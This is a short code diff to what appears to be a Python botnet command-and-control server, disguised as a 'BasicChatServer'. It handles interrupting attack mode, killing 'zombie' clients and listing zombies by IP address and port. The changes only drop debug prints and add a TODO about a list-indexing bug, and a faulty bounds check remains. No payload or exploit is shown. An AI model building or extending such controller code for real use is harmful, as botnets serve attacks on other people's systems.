@@ -115,9 +115,8 @@ class BasicChatServer(SocketServer):
             client.send("Attack mode interrupted\n")
 
         elif data.startswith("kill"):
+            # TODO: Tá quebrando com remoção fora de ordem (provavelmente posicao da lista nao atualizada, self.clients com tamanho errado)
             zombie_id = data.strip()[-1]
-            print len(self.clients)
-            print self.clients[int(zombie_id)][1]
             if int(zombie_id) <= len(self.clients) and self.clients[int(zombie_id)][1] == "zombie":
                 print "Killing zombie " + zombie_id
                 zombie = self.clients[int(zombie_id)][0]
@@ -137,7 +136,6 @@ class BasicChatServer(SocketServer):
         i = 0
         for client,role in self.clients:
             if role == "zombie":
-                # print "Zombie #" + str(i) + " - at " + client.getpeername()[0] + " port " + client.getpeername()[1]
                 list += "Zombie #" + str(i) + " - at " + client.getpeername()[0] + " port " + str(client.getpeername()[1]) + "\n"
             i += 1
         return list
